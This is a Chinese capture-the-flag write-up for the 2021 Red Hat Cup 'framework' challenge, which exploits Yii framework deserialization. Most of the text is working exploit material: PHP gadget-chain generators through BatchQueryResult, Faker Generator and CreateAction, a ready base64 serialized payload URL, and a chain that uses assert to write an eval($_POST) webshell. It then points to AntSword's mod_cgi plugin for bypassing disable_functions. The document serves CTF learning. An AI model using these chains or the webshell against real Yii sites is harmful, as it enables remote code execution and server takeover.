# 原创
：  2021红帽杯 framework

# 2021红帽杯 framework

#### 2021红帽杯 framework

## 考点

> 
yii反序列化


## 思路

> 
直接 `/www.zip`发现源码，直接拷贝下来本地运行<br/> yii反序列化可以看看我之前的分析：[文章链接](https://blog.csdn.net/LYJ20010728/article/details/117305569)<br/> phpinfo中可以发现：system、eval之类的一些函数好像都没有效果，设置了disable_functions；assert能用、file_put_contents()也能用


## Payload

> 
POC链


```
&lt;?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this-&gt;checkAccess = 'phpinfo';
            $this-&gt;id = '5';
        }
    }
}

namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            $this-&gt;formatters['close'] = [new CreateAction, 'run'];
        }
    }
}

namespace yii\db{
    use Faker\Generator;

    class BatchQueryResult{
        private $_dataReader;

        public function __construct(){
            $this-&gt;_dataReader = new Generator;
        }
    }
}
namespace{
    echo base64_encode(serialize(new yii\db\BatchQueryResult));
}
?&gt;

```

> 
Payload


```
?r=site%2Fabout&amp;message=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NzoicGhwaW5mbyI7czoyOiJpZCI7czoxOiI1Ijt9aToxO3M6MzoicnVuIjt9fX19

```

> 
POC链


```
&lt;?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this-&gt;checkAccess = 'assert';
            $this-&gt;id = 'file_put_contents(\'shell.php\',\'&lt;?php eval($_POST[1]);?&gt;\');';
        }
    }
}

namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            $this-&gt;formatters['close'] = [new CreateAction(), 'run'];
        }
    }
}

namespace yii\db{
    use Faker\Generator;

    class BatchQueryResult{
        private $_dataReader;

        public function __construct(){
            $this-&gt;_dataReader = new Generator;
        }
    }
}
namespace{
    echo base64_encode(serialize(new yii\db\BatchQueryResult));
}
?&gt;

```

> 
上蚁剑，用插件，phpinfo的信息显示这里是Apache/2.4.6 (CentOS) PHP/5.6.40，选择Apache_mod_cgi

